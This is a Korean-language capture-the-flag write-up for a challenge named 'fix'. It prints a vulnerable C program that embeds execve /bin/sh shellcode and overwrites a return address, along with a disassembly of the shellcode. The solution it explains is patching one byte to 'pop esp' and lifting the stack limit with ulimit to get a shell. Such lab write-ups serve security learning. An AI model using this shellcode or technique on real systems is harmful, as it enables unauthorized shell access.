---
sort: 9
---

# fix

home 디렉토리에 fix.c에 소스코드가 있다.

```c
#include <stdio.h>

// 23byte shellcode from http://shell-storm.org/shellcode/files/shellcode-827.php
char sc[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
                "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

void shellcode(){
        // a buffer we are about to exploit!
        char buf[20];

        // prepare shellcode on executable stack!
        strcpy(buf, sc);

        // overwrite return address!
        *(int*)(buf+32) = buf;

        printf("get shell\n");
}

int main(){
        printf("What the hell is wrong with my shellcode??????\n");
        printf("I just copied and pasted it from shell-storm.org :(\n");
        printf("Can you fix it for me?\n");

        unsigned int index=0;
        printf("Tell me the byte index to be fixed : ");
        scanf("%d", &index);
        fflush(stdin);

        if(index > 22)  return 0;

        int fix=0;
        printf("Tell me the value to be patched : ");
        scanf("%d", &fix);

        // patching my shellcode
        sc[index] = fix;

        // this should work..
        shellcode();
        return 0;
}
```
<br>
shellcode는 아래와 같다.
```
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
d:  89 e3                   mov    ebx,esp
f:  50                      push   eax
10: 53                      push   ebx
11: 89 e1                   mov    ecx,esp
13: b0 0b                   mov    al,0xb
15: cd 80                   int    0x80
```
<br>
stack에 /bin/sh 문자열을 집어넣고 이를 이용해서 execve를 호출하는 모습이다.<br>
근데 이게 문제점이 뭐냐면, shellcode가 들어있는 buf의 위치와 esp가 가리키는 위치가 너무 가까워서 값을 push하다가 shellcode가 덮여써져서 망가진다는 것이다.<br>
따라서 esp를 shellcode가 담겨있는 곳에서 멀리 떨어진 곳으로 옮길 것이다.<br>
한 byte만 수정할 수 있기 때문에, 15번째 byte인 push eax (0x50)을 pop esp를 나타내는 0x5c로 바꿔서 esp의 위치를 0x6e69622f로 바꿀 것이다. 그러나 무작정 이렇게 해버리면 stack segment영역에서 벗어나기 때문에 segmentation fault가 뜨게 된다. 따라서 stack의 크기를 무제한으로 늘릴 수 있도록 `ulimit -s unlimited`를 이용해서 stack크기의 제한을 없앨 것이다. 그러면 된다.


```tip
## 알게 된 점

ulimit
```